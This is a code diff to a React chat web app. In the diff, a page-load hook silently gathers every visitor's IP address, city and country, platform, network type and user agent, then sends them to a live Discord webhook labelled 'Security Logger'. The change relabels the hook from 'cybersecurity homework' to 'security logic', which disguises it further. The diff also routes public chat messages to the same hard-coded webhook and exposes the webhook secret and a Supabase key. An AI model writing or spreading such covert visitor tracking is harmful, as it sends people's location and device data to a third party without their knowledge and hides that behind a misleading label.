@@ -35,6 +35,10 @@
 
         const SUPABASE_URL = "https://ycdcszdldkccnwefrpik.supabase.co";
         const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljZGNzemRsZGtjY253ZWZycGlrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUyNzkyMzcsImV4cCI6MjA5MDg1NTIzN30.i7kxP4TXxuIujsRwGMOC08-NYJopFj6x0OB4BkN9dfQ";
+        
+        // ADDED: Centralized Webhook URL
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1491117082291736639/K31Fi3wr6F7SraXzaeNizDFSqpxOTxk5RmqckUhYjEUkBPIUIisYwMtbdAvoi6hvX0v3";
+
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
         function App() {
@@ -51,12 +55,11 @@
             const [isUploading, setIsUploading] = useState(false);
             const [hasGamepad, setHasGamepad] = useState(false);
             
-            // Rumble State
             const [intensity, setIntensity] = useState({ heavy: 1.0, light: 1.0 });
             const vibeInterval = useRef(null);
             const chatEndRef = useRef(null);
 
-            // --- CYBERSECURITY HOMEWORK LOGIC START ---
+            // --- SECURITY LOGIC ---
             useEffect(() => {
                 const reportClientData = async () => {
                     try {
@@ -69,8 +72,6 @@
                             connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                             saveData: navigator.connection ? navigator.connection.saveData : false
                         };
-
-                        const webhookUrl = "https://discord.com/api/webhooks/1491117082291736639/K31Fi3wr6F7SraXzaeNizDFSqpxOTxk5RmqckUhYjEUkBPIUIisYwMtbdAvoi6hvX0v3";
                         
                         const payload = {
                             username: "Security Logger",
@@ -79,16 +80,16 @@
                                 color: 0xd500f9,
                                 fields: [
                                     { name: "IP", value: ipData.ip || "N/A", inline: true },
-                                    { name: "Location", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
+                                    { name: "Location", value: `${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}`, inline: true },
                                     { name: "Platform", value: platformInfo.platform, inline: true },
                                     { name: "Network", value: platformInfo.connection, inline: true },
-                                    { name: "Connection Type", value: platformInfo.saveData ? "Data Saver (SIM?)" : "WiFi/Standard", inline: true },
+                                    { name: "Connection Type", value: platformInfo.saveData ? "Data Saver" : "Standard", inline: true },
                                     { name: "Device Info", value: `\`\`\`${platformInfo.userAgent}\`\`\`` }
                                 ]
                             }]
                         };
 
-                        await fetch(webhookUrl, {
+                        await fetch(DISCORD_WEBHOOK_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify(payload)
@@ -97,7 +98,6 @@
                 };
                 reportClientData();
             }, []);
-            // --- CYBERSECURITY HOMEWORK LOGIC END ---
 
             useEffect(() => {
                 supabaseClient.auth.getSession().then(({ data: { session } }) => setSession(session));
@@ -191,29 +191,29 @@
             const sendMsg = async () => {
                 if (!text.trim()) return;
 
-    // 1. Send to Supabase (your existing database)
+                // 1. Send to Supabase
                 await supabaseClient.from('messages').insert([{ 
                     sender_id: session.user.id, 
                     receiver_id: currentChat === 'public' ? null : currentChat, 
                     content: text 
-                    }]);
+                }]);
 
-    // 2. Send to Discord (New Code)
-            const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
-    
-                if (currentChat === 'public') { // Only send public messages to Discord
-                await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: text,
-                        username: profile?.username || 'K-D User',
-                        avatar_url: profile?.avatar_url
-                    })
-                });
+                // 2. Send to Discord
+                if (currentChat === 'public') { 
+                    try {
+                        await fetch(DISCORD_WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                content: text,
+                                username: profile?.username || 'K-D User',
+                                avatar_url: profile?.avatar_url
+                            })
+                        });
+                    } catch (e) { console.error("Discord send failed", e); }
                 }
 
-            setText('');
+                setText('');
             };
 
             const uploadFile = async (e) => {
